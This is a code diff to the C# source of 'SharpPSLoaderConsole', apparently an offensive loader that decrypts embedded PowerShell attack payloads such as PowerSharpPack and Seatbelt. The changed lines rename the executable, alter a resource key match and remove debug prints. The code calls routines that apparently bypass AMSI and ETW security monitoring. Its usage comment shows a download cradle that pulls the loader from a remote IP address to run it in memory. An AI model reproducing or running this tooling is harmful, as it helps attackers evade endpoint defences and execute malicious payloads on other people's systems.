@@ -24,7 +24,7 @@ using System.Reflection;
  *  
  * Usage: 
  *  - Console
- *      .\SharpPSLoaderLibrary.exe 1 powersharppack -seatbelt -command "-group=user"
+ *      .\SharpPSLoaderConsole.exe 1 powersharppack -seatbelt -command "-group=user"
  *      
  *  - In-memory (Obfuscated, Non-obfuscated)
  *      $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoader.exe")
@@ -106,7 +106,7 @@ namespace SharpPSLoaderConsole
             switch (payload.Trim().ToLower())
             {
                 case "1":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("arppack")).Select(a => a.Value).First();
+                    encPayload = resourceDict.Where(a => a.Key.Contains("arppac")).Select(a => a.Value).First();
                     break;
                 case "2":
                     encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
@@ -314,8 +314,6 @@ namespace SharpPSLoaderConsole
         // -------------------------------------------------------------------------------------------------
         public static void Main(string[] args)
         {
-            Console.WriteLine("[+] Starting from main! ");
-
             SharpPSLoaderConsole psLoader = new SharpPSLoaderConsole();
             psLoader.bypassSI();
             psLoader.bypassTW();
@@ -324,7 +322,6 @@ namespace SharpPSLoaderConsole
             string powershellPayload = "";
             if (args[0] != null)
             {
-                Console.WriteLine("Args0 = {0}", args[0]);
                 powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, args[0]);
             }
 
